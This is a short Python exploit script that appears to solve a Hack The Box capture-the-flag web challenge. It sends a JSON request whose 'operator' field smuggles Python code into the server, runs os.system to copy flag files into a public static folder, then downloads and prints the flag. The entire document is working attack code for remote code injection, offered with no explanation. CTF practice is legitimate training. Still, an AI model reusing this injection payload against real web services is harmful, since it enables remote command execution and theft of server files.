#!/usr/bin/python3

from requests import get, post
from sys import argv
from re import findall

try:
	url = argv[1]
except:
	url = "http://142.93.39.188:30978"

payload = "\nimport os\nos.system(\"cat /flag* > application/static/js/flag.txt\")\n+"

data = {"current_health":"100", "attack_power":"90", "operator": payload}

req = post(url + "/api/get_health", json=data)

if req.status_code != 200:
	print("Oooops exploit not successful...")
	exit(1)

req = get(url + "/static/js/flag.txt")

flag = findall("HTB{.*}", req.text)[0]
print(flag)
